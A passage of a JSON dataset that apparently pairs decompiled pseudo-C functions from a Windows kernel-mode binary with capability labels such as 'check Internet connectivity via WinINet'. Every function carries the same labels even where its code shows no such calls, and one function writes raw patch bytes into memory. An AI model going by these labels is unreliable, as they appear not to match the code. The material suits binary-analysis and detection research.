        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0001a3a0(int32_t *arg_8h)\n\n{\n    uint var_ch;\n    int32_t var_5h;\n    \n    *NULL = fcn.0005a5e0(*(arg_8h[1] + 4), &var_5h);\n    if (*NULL == 0) {\n        if (var_5h == '\\0') {\n            *(*arg_8h + 4) = *(*arg_8h + 0xc);\n        }\n        else {\n            *(*arg_8h + 4) = *(*arg_8h + 8);\n        }\n        if (**(*arg_8h + 4) == '\\0') {\n            stack0xfffffff8 = 0x21590206;\n        }\n        else {\n            if (**(*arg_8h + 4) == '&') {\n                *NULL = fcn.0001a2e0(*(arg_8h[1] + 4), *(*arg_8h + 4), arg_8h[1] + 0x14);\n            }\n            else {\n                *NULL = fcn.0005d780(*(arg_8h[1] + 4), *(*arg_8h + 4), arg_8h[1] + 0x14);\n            }\n            if (stack0xfffffff8 == 0) {\n                *NULL = fcn.0005d070(*(arg_8h[1] + 4), *(arg_8h[1] + 0x14), 0x8005169c, arg_8h[1] + 0x18);\n                if (*NULL == 0) {\n                    fcn.0005d070(*(arg_8h[1] + 4), *(arg_8h[1] + 0x14), 0x800516a8, arg_8h[1] + 0x1c);\n                    *NULL = fcn.0005b390(*(arg_8h[1] + 4), *(arg_8h[1] + 0x18), 0, 0);\n                    if (*NULL == 0) {\n                        *(arg_8h[1] + 8) = 0;\n                    }\n                    else {\n                        fcn.0005de60(*(arg_8h[1] + 4), *(arg_8h[1] + 0x14), 1);\n                    }\n                }\n                else {\n                    fcn.0005de60(*(arg_8h[1] + 4), *(arg_8h[1] + 0x14), 1);\n                }\n            }\n        }\n    }\n    if (stack0xfffffff8 != 0) {\n        *(arg_8h[1] + 0x14) = 0;\n        *(arg_8h[1] + 0x18) = 0;\n        *(arg_8h[1] + 0x1c) = 0;\n        *(arg_8h[1] + 8) = 1;\n        if (stack0xfffffff8 == 0x21590206) {\n            *(arg_8h[1] + 0xc) = 1;\n        }\n        fcn.00037420(*arg_8h + 0x18);\n    }\n    fcn.00037550(0x800cdc5c, 0);\n    (**0x800512e0)();\n    fcn.000357f0(arg_8h);\n    return stack0xfffffff8;\n}\n",
        "token_count": 794
    },
    "0001a5d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0001a5d0(int32_t *arg_8h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    if (*(arg_8h[1] + 0x1c) != 0) {\n        var_4h = fcn.0005b390(*(arg_8h[1] + 4), *(arg_8h[1] + 0x1c), 0, 0);\n    }\n    if (var_4h == 0) {\n        var_4h = fcn.0005de60(*(arg_8h[1] + 4), *(arg_8h[1] + 0x14), 1);\n    }\n    fcn.00037420(*arg_8h + 0x18);\n    fcn.00037550(0x800cdc5c, 0);\n    (**0x800512e0)();\n    fcn.000357f0(arg_8h);\n    return var_4h;\n}\n",
        "token_count": 243
    },
    "0001a670": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.0001a670(void)\n\n{\n    int32_t iVar1;\n    uint32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_10h = 0;\n    do {\n        var_14h = 0;\n        var_4h = -1;\n        while( true ) {\n            fcn.00034a10(0x800cdc58);\n            iVar1 = fcn.00037590(0x800cdc5c, 1);\n            if (iVar1 != 0) break;\n            fcn.00034a80(0x800cdc58);\n            fcn.00043cb0(0x14);\n        }\n        for (var_8h = 0; var_8h < 0x32; var_8h = var_8h + 1) {\n            *(var_8h * 0x24 + -0x7ff32380) = 0;\n            if (*(var_8h * 0x24 + -0x7ff3237f) != '\\0') {\n                for (var_18h = 0; var_18h < *(var_8h * 0x24 + -0x7ff32378); var_18h = var_18h + 1) {\n                    if ((*(*(var_8h * 0x24 + -0x7ff32374) + 0x14 + var_18h * 0x20) != 0) &&\n                       (*(*(var_8h * 0x24 + -0x7ff32374) + 0x10 + var_18h * 0x20) == 0)) {\n                        var_ch = *(*(var_8h * 0x24 + -0x7ff32374) + 0x1c + var_18h * 0x20);\n                        var_10h = *(*(var_8h * 0x24 + -0x7ff32374) + 4 + var_18h * 0x20);\n                        var_14h = *(*(var_8h * 0x24 + -0x7ff32374) + 0x14 + var_18h * 0x20);\n                        *(*(var_8h * 0x24 + -0x7ff32374) + 8 + var_18h * 0x20) = 1;\n                        *(*(var_8h * 0x24 + -0x7ff32374) + 0x14 + var_18h * 0x20) = 0;\n                        break;\n                    }\n                }\n                if (var_14h != 0) break;\n                fcn.000357f0(*(var_8h * 0x24 + -0x7ff32374));\n                *(var_8h * 0x24 + -0x7ff3237f) = 0;\n            }\n        }\n        if (0x31 < var_8h) {\n            *0x800ce374 = 0;\n            fcn.000357f0(*0x800ce378);\n            var_4h = 0;\n        }\n        fcn.00037550(0x800cdc5c, 1);\n        fcn.00034a80(0x800cdc58);\n        if (var_4h == 0) {\n            return;\n        }\n        if (var_14h != 0) {\n            if (var_ch != 0) {\n                var_4h = fcn.0005b390(var_10h, var_ch, 0, 0);\n            }\n            if (var_4h == 0) {\n                fcn.0005de60(var_10h, var_14h, 1);\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 900
    },
    "0001a970": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0001a970(uint arg_8h, uint arg_ch, uint32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    if (arg_18h == 0) {\n        arg_1ch = 0;\n    }\n    if (arg_14h == 0) {\n        arg_14h = -0x7ffa56b0;\n    }\n    var_8h = arg_8h;\n    var_4h = arg_ch;\n    var_14h = (**0x800510fc)(&var_8h, 0, &var_ch);\n    if (var_14h == 0) {\n        uVar3 = fcn.000356f0(0x30);\n        iVar2 = uVar3;\n        if (iVar2 == 0) {\n            var_14h = -0x3fffffe9;\n        }\n        else {\n            (**0x800510c0)(iVar2, var_ch, 0, arg_14h, 0, arg_18h, uVar3 >> 0x20 & 0xffffff00 | arg_10h & 0xff, arg_1ch);\n            cVar1 = (**0x800510cc)(iVar2, arg_20h, 0, 0);\n            var_14h = (-(cVar1 != '\\0') & 0x3fffffff) + 0xc0000001;\n        }\n        if (var_ch != 0) {\n            (**0x800512e0)();\n        }\n        if ((var_14h != 0) && (iVar2 != 0)) {\n            (**0x800510b4)(iVar2, 0);\n        }\n    }\n    return var_14h;\n}\n",
        "token_count": 473
    },
    "0001ab50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0001ab50(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00078a68();\n    var_8h = 0;\n    do {\n        if (0xfff < var_8h) {\ncode_r0x0001abbe:\n            (**0x800510ec)((-(var_8h < 0x1000) & 0x3fffff45) + 0xc00000bb);\n            return;\n        }\n        if (*(iVar1 + var_8h) == -0x7ffa54b0) {\n            iVar2 = fcn.000533b0(0x800ce380, var_8h, 0);\n            iVar3 = fcn.00035150();\n            if (iVar3 != 0x26) goto code_r0x0001abbe;\n            if (iVar2 != 0) {\n                fcn.00071080(0x800ce384, var_8h);\n                goto code_r0x0001abbe;\n            }\n        }\n        var_8h = var_8h + 4;\n    } while( true );\n}\n",
        "token_count": 287
    },
    "0001abe0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0001abe0(code **arg_8h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.00078a68();\n    var_10h = 0;\n    var_ch = 0;\n    pcVar1 = *arg_8h;\n    pcVar2 = arg_8h[1];\n    var_8h = 0;\n    var_14h = 0;\n    iVar4 = fcn.00078a6e();\n    iVar4 = iVar4 + *(*0x800cc770 + 0xc);\n    iVar5 = fcn.000533b0(0x800ce380, 0, 0);\n    if (iVar5 != 0) {\n        var_10h = *0x800ce380;\n        var_8h = *(iVar3 + *0x800ce380);\n        *(iVar3 + *0x800ce380) = iVar4;\n    }\n    iVar5 = fcn.000533b0(0x800ce384, 0, 0);\n    if (iVar5 != 0) {\n        var_ch = *0x800ce384;\n        var_14h = *(iVar3 + *0x800ce384);\n        *(iVar3 + *0x800ce384) = iVar4;\n    }\n    fcn.000357f0(arg_8h);\n    uVar6 = (*pcVar1)(pcVar2);\n    if (var_8h != 0) {\n        *(iVar3 + var_10h) = var_8h;\n    }\n    if (var_14h != 0) {\n        *(iVar3 + var_ch) = var_14h;\n    }\n    (**0x800510ec)(uVar6);\n    return;\n}\n",
        "token_count": 493
    },
    "0001ace0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001ace0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_10h;\n    uint *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    uVar2 = 0x800ce380;\n    iVar1 = fcn.000533b0(0x800ce380, 0, 0);\n    if (iVar1 == 0) {\n        iVar1 = (**0x800510e0)(&var_10h, 0x1f03ff, 0, 0, 0, 0x8005ab50, 0);\n        if (iVar1 == 0) {\n            fcn.00078a62(var_10h, 0, 0);\n            fcn.000789b4();\n            uVar2 = var_10h;\n        }\n    }\n    var_ch = fcn.000356c0(8);\n    if (var_ch == NULL) {\n        var_8h = -0x3fffff66;\n    }\n    else {\n        var_4h = arg_8h;\n        *var_ch = arg_ch;\n        var_ch[1] = arg_10h;\n        var_8h = (**0x800510e0)(arg_8h, 0x1f03ff, 0, 0, 0, 0x8005abe0, var_ch, uVar2);\n    }\n    if (var_8h == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.00078a2c(var_8h);\n        fcn.000359a0(uVar2);\n        uVar2 = 0xffffffff;\n    }\n    return uVar2;\n}\n",
        "token_count": 414
    },
    "0001ae20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001ae20(uint arg_8h, int32_t *arg_ch, uint8_t *arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t extraout_ECX;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_8h = 0;\n    uVar1 = (**0x80051004)();\n    *arg_10h = uVar1;\n    if (*arg_10h < arg_8h) {\n        uVar1 = (**0x80051014)();\n        *arg_10h = uVar1;\n    }\n    iVar2 = fcn.00057cd0();\n    if (iVar2 == 1) {\n        var_10h = 0;\n    }\n    else {\n        fcn.0001a8c0(0x800ce388, 0);\n        fcn.0001a8c0(0x800ce38c, 0);\n        iVar2 = fcn.00057cd0();\n        var_8h = fcn.000356f0(iVar2 << 5);\n        if (var_8h == 0) {\n            var_10h = 0xc0000017;\n        }\n        else {\n            uVar3 = fcn.0001a8b0();\n            for (var_4h = 0; uVar4 = fcn.00057cd0(),  var_4h < uVar4; var_4h = var_4h + 1) {\n                if (var_4h != uVar3) {\n                    (**0x800510d4)(var_4h * 0x20 + var_8h, 0x8005ade0, 0);\n                    (**0x800510ac)(var_4h * 0x20 + var_8h, 2);\n                    (**0x800510b0)(var_4h * 0x20 + var_8h, extraout_ECX & 0xffffff00 | var_4h & 0xff);\n                    (**0x800510f4)(var_4h * 0x20 + var_8h, 0, 0);\n                }\n            }\n            iVar2 = fcn.00057cd0();\n            iVar2 = iVar2 + -1;\n            do {\n                iVar5 = fcn.000533b0(0x800ce38c, iVar2, iVar2);\n            } while (iVar5 != iVar2);\n            var_10h = 0;\n        }\n    }\n    *arg_ch = var_8h;\n    return var_10h;\n}\n",
        "token_count": 633
    },
    "0001af70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001af70(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    \n    fcn.00037400(0x800ce388);\n    do {\n        iVar1 = fcn.000533b0(0x800ce38c, 0, 0);\n    } while (iVar1 != 0);\n    if (arg_8h != 0) {\n        fcn.000357f0(arg_8h);\n    }\n    (**0x80051008)();\n    return 0;\n}\n",
        "token_count": 125
    },
    "0001afc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0001afc0(uint param_1, uint param_2, uint param_3, int32_t *param_4)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h;\n    int32_t *var_14h;\n    uint var_18h;\n    uint var_1ch;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8ca0;\n    uStack16 = 0x800b8bf4;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    if (var_14h == NULL) {\n        uVar1 = 0xc000000d;\n    }\n    else {\n        iVar2 = (**0x8005128c)(var_8h, var_ch, 0, 0, 0);\n        if (iVar2 == 0) {\n            uVar1 = 0xc0000001;\n        }\n        else {\n            var_4h = 0;\n            (**0x80051298)(iVar2, 0, var_10h);\n            *var_14h = iVar2;\n            uVar1 = 0;\n        }\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return uVar1;\n}\n",
        "token_count": 344
    },
    "0001b0a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0001b0a0(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    int32_t var_8h;\n    int32_t var_ch;\n    uint var_18h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x800b8c90;\n    uStack16 = 0x800b8bf4;\n    var_10h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h;\n    if ((var_8h == 0) || (var_ch == 0)) {\n        uVar1 = 0xc0000005;\n    }\n    else {\n        var_4h = 0;\n        (**0x80051294)(var_ch);\n        (**0x800512a4)(var_ch);\n        uVar1 = 0;\n    }\n    *in_FS_OFFSET = var_10h;\n    return uVar1;\n}\n",
        "token_count": 251
    },
    "0001b150": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0001b150(int32_t *arg_8h, uint arg_ch, uint32_t arg_10h, uint arg_14h, uint *arg_18h)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == NULL) {\n        iVar1 = -0x3fffff11;\n    }\n    else {\n        uVar2 = fcn.0001afc0(*arg_8h, arg_ch, arg_14h, arg_18h);\n        iVar1 = uVar2;\n        if (iVar1 == 0) {\n            iVar1 = (**0x800510e4)(*arg_18h, uVar2 >> 0x20 & 0xffffff00 | arg_10h & 0xff, 1, 0, 0, 0x10);\n            if (iVar1 == 0) {\n                fcn.0001b0a0(*arg_8h, *arg_18h);\n                iVar1 = -0x3fffffff;\n            }\n            else {\n                *arg_8h = iVar1;\n                iVar1 = 0;\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 283
    },
    "0001b1e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001b1e0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    if ((arg_8h == 0) || (arg_ch == 0)) {\n        uVar1 = 0xc0000005;\n    }\n    else {\n        (**0x800510a8)(arg_8h, arg_ch);\n        uVar1 = fcn.0001b0a0(arg_8h, arg_ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 120
    },
    "0001b220": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0001b220(int16_t *arg_8h, int16_t *arg_ch, int32_t arg_10h, uint32_t arg_14h, uint32_t *arg_18h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    bool bVar3;\n    uint var_288h;\n    uint var_280h;\n    uint *var_27ch;\n    uint var_278h;\n    uint var_270h;\n    uint *var_26ch;\n    uint var_268h;\n    uint var_260h;\n    int16_t *var_25ch;\n    uint32_t var_258h;\n    uint var_254h;\n    uint var_250h;\n    uint *var_24ch;\n    uint var_248h;\n    uint var_244h;\n    uint var_240h;\n    int32_t var_23ch;\n    uint32_t var_238h;\n    uint32_t var_234h;\n    uint var_22ch;\n    int32_t var_224h;\n    uint var_220h;\n    uint32_t var_21ch;\n    uint var_218h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int16_t *var_4h;\n    \n    var_23ch = 0;\n    var_ch = 0;\n    var_8h = 0;\n    var_238h = 0;\n    var_234h = 0;\n    if (((arg_8h == NULL) || (*arg_8h == 0)) || (arg_ch == NULL)) {\n        return -0x3ffffff3;\n    }\n    fcn.00036970(&var_218h, 0x104, arg_8h);\n    fcn.000789c0(&var_22ch, &var_218h);\n    var_254h = 0x18;\n    var_250h = 0;\n    var_248h = 0x40;\n    var_24ch = &var_22ch;\n    var_244h = 0;\n    var_240h = 0;\n    var_224h = fcn.0001f080(&var_ch, 0x80100000, &var_254h, &var_220h, 0, 0x80, 1, 1, 0x10, 0, 0);\n    if (var_224h != 0) {\n        return var_224h;\n    }\n    if (*arg_ch != 0) {\n        var_25ch = arg_ch;\n        do {\n            iVar1 = *var_25ch;\n            var_25ch = var_25ch + 1;\n        } while (iVar1 != 0);\n        if (arg_ch[(var_25ch - (arg_ch + 1) >> 1) + -1] != 0x5c) {\n            fcn.00036970(&var_218h, 0x104, arg_ch);\n            goto code_r0x0001b4e5;\n        }\n    }\n    iVar2 = fcn.00078a14(arg_8h, 0x5c);\n    if (iVar2 == 0) {\n        var_4h = arg_8h;\n    }\n    else {\n        var_4h = iVar2 + 2;\n    }\n    if (*arg_ch == 0) {\n        fcn.00036970(&var_218h, 0x104, var_4h);\n    }\n    else {\n        fcn.00036970(&var_218h, 0x104, arg_ch);\n        var_26ch = &var_218h;\n        do {\n            iVar1 = *var_26ch;\n            var_26ch = var_26ch + 2;\n        } while (iVar1 != 0);\n        fcn.00078a5c(&var_218h, 0x800516b4, 0x104 - (var_26ch - (&var_218h + 2) >> 1));\n        var_27ch = &var_218h;\n        do {\n            iVar1 = *var_27ch;\n            var_27ch = var_27ch + 2;\n        } while (iVar1 != 0);\n        fcn.00078a5c(&var_218h, var_4h, 0x104 - (var_27ch - (&var_218h + 2) >> 1));\n    }\ncode_r0x0001b4e5:\n    fcn.000789c0(&var_22ch, &var_218h);\n    var_254h = 0x18;\n    var_250h = 0;\n    var_248h = 0x40;\n    var_24ch = &var_22ch;\n    var_244h = 0;\n    var_240h = 0;\n    var_224h = fcn.0001f080(&var_8h, 0x40100000, &var_254h, &var_220h, 0, 0x80, 0, arg_18h != NULL, 0x10, 0, 0);\n    if (var_224h == 0) {\n        var_23ch = fcn.000356c0(0x10000);\n        if (var_23ch == 0) {\n            var_224h = -0x3fffff66;\n        }\n        else {\n            if (arg_18h == NULL) {\n                var_238h = 0;\n                var_234h = 0;\n            }\n            else {\n                var_238h = *arg_18h;\n                var_234h = arg_18h[1];\n            }\n            var_21ch = 0;\n            while ((arg_10h == 0 || (iVar2 = (**0x800510b8)(arg_10h),  iVar2 == 0))) {\n                bVar3 = CARRY4(var_21ch, var_238h);\n                var_238h = var_21ch + var_238h;\n                var_234h = var_234h + bVar3;\n                var_224h = fcn.00078a56(var_ch, 0, 0, 0, &var_220h, var_23ch, 0x10000, &var_238h, 0);\n                if (var_224h != 0) {\n                    if (var_224h == -0x3fffffef) {\n                        var_224h = 0;\n                    }\n                    goto code_r0x0001b740;\n                }\n                if ((arg_10h != 0) && (iVar2 = (**0x800510b8)(arg_10h),  iVar2 != 0)) {\n                    var_224h = -0x3ffffee0;\n                    goto code_r0x0001b740;\n                }\n                var_224h = fcn.000789e4(var_8h, 0, 0, 0, &var_220h, var_23ch, var_21ch, &var_238h, 0);\n                if (var_224h != 0) goto code_r0x0001b740;\n                if (arg_14h != 0) {\n                    for (var_258h = arg_14h / 200; var_258h != 0; var_258h = var_258h - 1) {\n                        if ((arg_10h != 0) && (iVar2 = (**0x800510b8)(arg_10h),  iVar2 != 0)) {\n                            var_224h = -0x3ffffee0;\n                            goto code_r0x0001b740;\n                        }\n                        fcn.00043cb0(200);\n                    }\n                }\n            }\n            var_224h = -0x3ffffee0;\n        }\n    }\ncode_r0x0001b740:\n    if (var_23ch != 0) {\n        fcn.000357f0(var_23ch);\n    }\n    if (var_8h != 0) {\n        fcn.000789b4(var_8h);\n    }\n    if (var_ch != 0) {\n        fcn.000789b4(var_ch);\n    }\n    if ((var_224h == -0x3ffffee0) && (arg_18h != NULL)) {\n        *arg_18h = var_238h;\n        arg_18h[1] = var_234h;\n    }\n    return var_224h;\n}\n",
        "token_count": 1909
    },
    "0001b7b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0001b7b0(void)\n\n{\n    uchar *puVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint *arg_8h;\n    uint uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    uint *puVar10;\n    int32_t arg_8h_00;\n    uint var_288h;\n    uint var_284h;\n    int32_t var_280h;\n    uint var_27ch;\n    uchar *var_278h;\n    uint var_274h;\n    uchar *var_270h;\n    uint var_269h;\n    int32_t var_258h;\n    int32_t var_1cch;\n    int32_t var_1a0h;\n    int32_t var_9h;\n    uint var_4h;\n    \n    var_269h._0_1_ = 0;\n    var_9h._0_1_ = '\\0';\n    if (*0x800ce390 == NULL) {\n        uVar2 = (**0x80051004)();\n        if (uVar2 < 2) {\n            fcn.000610a0(&var_269h + 1);\n            fcn.00061140(&var_269h + 1, 0x20);\n            fcn.000611a0(&var_269h + 1, 0);\n            *NULL = fcn.0005cd70(*(*0x800cc770 + 0xc), 0x800516b8, &var_278h);\n            puVar1 = var_278h;\n            if (*NULL == 0) {\n                uVar8 = var_278h & 0xfff;\n                var_280h = -uVar8 + 0x1000;\n                *NULL = fcn.0001afc0(var_278h, var_280h, 0, &var_4h);\n                if (*NULL == 0) {\n                    var_269h._0_1_ = '\\x01';\n                    iVar7 = (puVar1 & 0xfffff000) + 0x1000;\n                    iVar3 = fcn.0001afc0(iVar7, 0x1000, 0, &var_274h);\n                    if (iVar3 == 0) {\n                        var_9h._0_1_ = '\\x01';\n                        var_280h = -uVar8 + 0x2000;\n                    }\n                    arg_8h = fcn.000356f0(0x60);\n                    if (arg_8h != NULL) {\n                        var_270h = var_278h;\n                        fcn.00060ce0(&var_269h + 1, var_278h, var_280h);\ncode_r0x0001b936:\n                        iVar3 = fcn.000610e0(&var_269h + 1);\n                        if (iVar3 == 0) {\n                            stack0xfffffff4 = -0x3fffffff;\n                            fcn.000357f0(arg_8h);\n                        }\n                        else {\n                            if (var_1cch != 0x1be) goto code_r0x0001ba45;\n                            stack0xfffffff4 = 0;\n                            var_270h = (var_270h - var_278h) + arg_8h;\n                            *var_270h = 0xc6;\n                            var_270h[1] = 0x80;\n                            *(var_270h + 2) = var_280h;\n                            var_270h[6] = 0;\n                            var_270h[7] = 0xc3;\n                            puVar9 = arg_8h;\n                            puVar10 = arg_8h + 0xc;\n                            *0x800ce390 = arg_8h;\n                            for (iVar3 = 0xc; iVar3 != 0; iVar3 = iVar3 + -1) {\n                                *puVar10 = *puVar9;\n                                puVar9 = puVar9 + 1;\n                                puVar10 = puVar10 + 1;\n                            }\n                            var_270h = var_270h + 0x36;\n                            *var_270h = 1;\n                            *0x800ce394 = arg_8h + 0xc;\n                        }\n                        goto code_r0x0001baa5;\n                    }\n                    stack0xfffffff4 = -0x3fffff66;\ncode_r0x0001baa5:\n                    if (var_269h != '\\0') {\n                        fcn.0001b0a0(puVar1, var_4h);\n                    }\n                    if (var_9h != '\\0') {\n                        fcn.0001b0a0(iVar7, var_274h);\n                    }\n                }\n            }\n        }\n        else {\n            *NULL = -0x3fffffff;\n        }\n    }\n    else {\n        *NULL = 0;\n    }\n    return *NULL;\ncode_r0x0001ba45:\n    uVar4 = fcn.000611d0(&var_269h + 1);\n    iVar3 = &var_269h + 1;\n    uVar5 = fcn.000611c0(iVar3);\n    arg_8h_00 = &var_269h + 1;\n    iVar6 = fcn.000611b0(arg_8h_00);\n    fcn.00078be8(iVar6 + arg_8h, arg_8h_00, uVar5, iVar3, uVar4);\n    var_280h = var_1a0h;\n    iVar3 = fcn.000611d0(&var_269h + 1);\n    var_270h = var_258h - iVar3;\n    goto code_r0x0001b936;\n}\n",
        "token_count": 1322
    },
    "0001baf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
